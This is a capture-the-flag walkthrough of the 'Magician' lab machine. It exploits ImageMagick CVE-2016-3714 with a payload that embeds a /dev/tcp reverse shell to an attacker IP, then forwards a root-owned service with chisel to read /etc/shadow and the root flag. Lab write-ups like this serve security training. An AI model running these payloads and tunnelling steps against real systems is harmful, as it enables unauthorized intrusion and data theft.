
# Magician

First things first: Edit the hosts file as you were asked in the beginning.

```bash
$ sudo nano /etc/hosts

# Add the following line:
10.10.215.1    magician
```

We'll proceed with our usual nmap scan:

```bash
$ sudo nmap magician -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

[x] 21/tcp   open  ftp        syn-ack ttl 63 vsftpd 2.0.8 or later

[x] 8080/tcp open  http-proxy syn-ack ttl 63

[x] 8081/tcp open  http       syn-ack ttl 63 nginx 1.14.0 (Ubuntu)

Also, nmap says that that there's ***/files*** directory at http://magician:8080.

And after visiting http://magician:8081 we find out, that we can upload files there.

We'll first try anonymous ftp login. Aaaaand success! After some time, we are
presented with a hint and "Login successful" status:

```
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```

All right! after visiting the link, we know that the server is vulnerable to 
CVE-2016-3714. I found a good exploit at [Hood3dRob1n's Github](https://github.com/Hood3dRob1n/CVE-2016-3714)

Download the exploit:

```bash
$ git clone https://github.com/Hood3dRob1n/CVE-2016-3714.git

$ cd CVE-2016-3714

$ python2 imagick_builder.py
```

And select cmd payload with reverse shell:

```
Imagick Payload Builder Options:
      cmd => Build Payload to Execute OS Command
     read => Build Payload to Read File
     move => Build Payload to Move a File
   delete => Build Payload to Delete a File
     ssrf => Build Payload for SSRF Request
     help => Help Menu
     exit => Exit Shell

   Enter Selection: cmd

   Enter Command to Embed in Payload: 0<&196;exec 196<>/dev/tcp/$ATTCKER_IP_GOES_HERE/8080; sh <&196 >&196 2>&196

[*] Payload can be renamed as needed to bypass filetype restrictions...
   [*] Payload 1 Saved To: ~/CTF/Magician/CVE-2016-3714/output/mvg_rce.mvg
   [*] Payload 2 Saved To: ~/CTF/Magician/CVE-2016-3714/output/svg_rce.svg

Imagick Payload Builder Options:
      cmd => Build Payload to Execute OS Command
     read => Build Payload to Read File
     move => Build Payload to Move a File
   delete => Build Payload to Delete a File
     ssrf => Build Payload for SSRF Request
     help => Help Menu
     exit => Exit Shell

   Enter Selection: exit

[*] Good Bye!
```

Now, setup the netcat listener and upload the ***mvg_rce.mvg*** file. Enjoy your reverse 
shell! You can upgrade it like this:

```bash
$ python -c "import pty; pty.spawn('/bin/bash')"
```

The user.txt file is at /home/magician.

---

## *Getting the root flag*

After trying some sommon privesc techniques (and finding them useless), I downloaded 
LinEnum.sh script to the victim machine and found a suspicious service at port 6666.

We'll forward it to our machine. First, navigate to [chisel releases](https://github.com/jpillora/chisel/releases/tag/v1.7.7)
and download the binary file. Unpack it and transfer to the victim machine.

```bash
$ gzip -d chisel_1.7.7_linux_amd64.gz
```

Next, transfer it:

- Victim machine:

```bash
$ nc -lvnp 8000 > chisel_1.7.7_linux_amd64
```

- Attacker machine:

```bash
$ nc magician 8000 < chisel_1.7.7_linux_amd64
```

After transfer is complete, kill netcat in the ***ATTCKER*** machine.

Next, on your ***attacker machine*** set up chisel server (I cloned it from Github,
so I run it with "go run"):

```bash
$ go run main.go server -p 3000 --reverse
```

After this, on the ***victim machine***, connect to server and forvard traffic from 6666 
port tp 8008 port of your machine

```bash
$ ./chisel_1.7.7_linux_amd64 client $ATTACKER_IP_GOES_HERE:3000 R:8008:127.0.0.1:6666
```

Navigate to http://127.0.0.1:8008/ iin your browser. You'll see a page that allows you
to read files by their names:

![service-6666](https://i.postimg.cc/yx4kpw1j/service-6666.png)

After trying to read ***/etc/shadow*** I realized that service is running as root. Hence,
we can input ***/root/root.txt***.
Then I got the flag, but it was 13 times rotated. Use [CyberChef](https://cyberchef.org/)
to get plaintext flag

